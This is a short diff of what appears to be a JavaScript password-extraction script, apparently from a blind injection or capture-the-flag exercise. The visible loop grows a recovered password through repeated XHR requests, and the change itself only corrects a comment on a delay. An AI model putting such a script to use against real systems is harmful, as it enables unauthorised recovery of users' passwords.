@@ -29,7 +29,7 @@ while (passwd.length < pass_len){
 		xhr.send(data);
 		})(i);
 	};
-	await new Promise(resolve => setTimeout(resolve, 2000)); // 3 sec
+	await new Promise(resolve => setTimeout(resolve, 2000)); // 2 sec
 };
 
 console.log(`Password is ${passwd}`);
